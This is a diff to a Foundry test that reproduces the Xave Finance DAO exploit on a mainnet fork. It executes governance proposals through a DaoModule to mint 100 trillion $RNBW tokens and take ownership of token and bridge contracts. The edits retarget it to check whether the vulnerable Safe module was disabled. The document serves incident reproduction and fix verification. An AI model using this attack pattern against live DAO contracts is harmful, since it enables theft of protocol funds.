@@ -2,6 +2,7 @@
 pragma solidity 0.8.10;
 
 import "forge-std/Test.sol";
+import "forge-std/console.sol";
 import "./interface.sol";
 
 contract Enum {
@@ -20,6 +21,8 @@ interface IDaoModule {
     function buildQuestion(string memory proposalId, bytes32[] memory txHashes) external pure returns(string memory);
 
     function questionIds (bytes32) external returns (bytes32);
+    function setMinimumBond(uint256) external;
+    function executor() external returns(address);
 }
 
 interface IRealitio {
@@ -42,11 +45,24 @@ contract XaveFinanceExploit is DSTest {
     IDaoModule daoModule = IDaoModule(0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F);
     IRealitio realitio = IRealitio (0x325a2e0F3CCA2ddbaeBB4DfC38Df8D19ca165b47);
 
-    address attacker = 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2;
-    address attackerContract = 0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3;
+    // if testing the attack uncomment the line below
+    // address attacker = 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2;
+
+    // if testing whether the Gnosis Safe module still allows `executeTransaction`
+    // from the DaoModule uncomment the line below
+    address attacker = 0xDAFEA492D9c6733ae3d56b7Ed1ADB60692c98Bc5;
+
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 15704745); // fork mainnet at 15704745 
+        //  - attacker called `addProposalWithNonce` at block number 15702767 - therefore if wanting to test
+        //    the full attack, fork mainnet at block 15702766
+        // cheats.createSelectFork("mainnet", 15702766);
+
+        //  - if wanting to test that the Gnosis Safe module has been successfully disabled then fork
+        //    mainnet at a block that is older than the one when the module has been removed
+        //   (ie. >= 15737130)
+        // see https://ethtx.info/mainnet/0xb97368bb743141fc8685ea3b5d56419c90bab87a7ac7ae490f0b1a89e5f51b39/
+        cheats.createSelectFork("mainnet", 15737130);
     }
 
     function encodeWithSignature_mint(address to, uint amount)
@@ -66,6 +82,13 @@ contract XaveFinanceExploit is DSTest {
     }
 
     function testAttack() public {
+
+        // executor / Safe address
+        cheats.prank(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E);
+        // reset minimum bond in order to allow execution to go through
+        // and reach the executor
+        daoModule.setMinimumBond(0);
+
         
         //tx to mint 100000000000000 $RNBW tokens
         bytes32 tx0 = daoModule.getTransactionHash(
@@ -124,7 +147,7 @@ contract XaveFinanceExploit is DSTest {
         emit log_named_address("[Before proposal Execution] Owner of $LPOP: ", LPOP.owner());
         emit log_named_address("[Before proposal Execution] Owner of PrimaryBridge: ", PrimaryBridge.owner());
         emit log_named_uint("[Before proposal Execution] Attacker's $RNBW Token Balance: ", RNBW.balanceOf(attacker) / 1 ether);
-        cheats.startPrank(attackerContract);
+        // cheats.startPrank(attackerContract);
 
         //Execute mint 100000000000000 $RNBW tokens
         daoModule.executeProposalWithIndex(
@@ -174,7 +197,7 @@ contract XaveFinanceExploit is DSTest {
             3
         );
 
-        cheats.stopPrank();
+        // cheats.stopPrank();
 
         emit log_string("--------------------------------------------------------------");
         emit log_named_address("[After proposal Execution] Owner of $RNBW: ", RNBW.owner());
